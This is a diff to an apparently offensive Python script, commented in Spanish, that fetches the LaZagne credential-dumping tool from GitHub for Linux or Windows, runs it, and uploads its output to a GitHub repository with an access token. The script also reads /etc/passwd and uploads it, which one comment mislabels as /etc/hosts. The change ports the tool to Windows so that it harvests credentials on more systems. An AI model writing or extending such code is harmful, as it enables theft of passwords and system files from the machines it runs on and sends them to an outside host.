@@ -1,3 +1,4 @@
+import platform
 import subprocess
 import requests
 import base64
@@ -55,10 +56,25 @@ def catAndUpload(filename, token):
     # Subir output.txt a GitHub
     uploadToGithub(output_filename, content, token)
 
+def get_os():
+    # Detectar el sistema operativo
+    os_name = platform.system()
+    if os_name == 'Linux':
+        urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
+        path = 'Linux'
+    elif os_name == 'Windows':
+        urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Windows/"
+        path = 'Windows'
+    else:
+        print('[-] Sistema operativo no soportado')
+        return None, None
+    return urlb, path
+
 def run(token):
-    urlb = "https://api.github.com/repos/AlessandroZ/LaZagne/contents/Linux/"
-    path = 'Linux'
-    
+    urlb, path = get_os()
+    if urlb is None or path is None:
+        return
+
     # Verificar si la carpeta ya existe
     if not os.path.exists(path):
         os.makedirs(path, exist_ok=True)
@@ -82,6 +98,8 @@ def run(token):
     uploadToGithub(output_filename, result.stdout, token)
 
     # Leer /etc/hosts y subirlo a GitHub
-    catAndUpload('/etc/passwd', token)
+    if path == 'Linux':
+        catAndUpload('/etc/passwd', token)
+
 
 
